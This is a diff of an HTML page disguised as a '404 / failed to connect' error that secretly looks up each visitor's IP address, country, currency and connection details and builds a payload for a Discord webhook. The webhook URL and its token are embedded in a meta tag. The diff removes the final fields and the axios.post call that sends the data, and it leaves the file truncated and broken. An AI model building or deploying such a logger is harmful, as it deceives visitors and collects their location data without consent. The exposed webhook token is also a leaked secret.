@@ -1,17 +1,17 @@
 <html>
 <head>
   <title>Error</title>
-</head>
-<body>
-  <h1>Failed To connect to Server.</h1>
-  <p>Error 404<span id="ip"></span></p>
-
+  
   <!-- include the Discord webhook URL in a meta tag -->
   <meta name="discord-webhook" content="https://discord.com/api/webhooks/1055687148382191656/312TTM14nJXhkRG2z5Scz8GvXd36DkI7otSYUYX5aayn9xiwGotS4Zrc3RYnNFB9istx">
 
   <!-- include the necessary libraries -->
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+</head>
+<body>
+  <h1>Failed To connect to Server.</h1>
+  <p>Error 404</p>
 
   <script>
     // use the 'fetch' API to retrieve the user's IP address
@@ -27,7 +27,7 @@
     description: 'Failed to connect to server. Error 404',
     fields: [{
       name: 'IP Address',
-      value: data.ip_address
+      value: data.ip
     }, {
       name: 'Country',
       value: data.country
@@ -74,22 +74,3 @@
       name: 'Currency Code',
       value: data.currency.currency_code
     }, {
-      name: 'Operator',
-      value: data.connection.autonomous_system_organization
-    }, {
-      name: 'Connection Type',
-      value: data.connection.connection_type
-    }, {
-      name: 'ISP Name',
-      value: data.connection.isp_name
-    }, {
-      name: 'Organization Name',
-      value: data.connection.organization_name,
-    }]
-  }]
-};
-
-axios.post(webhookUrl, payload);
-  </script>
-</body>
-</html>
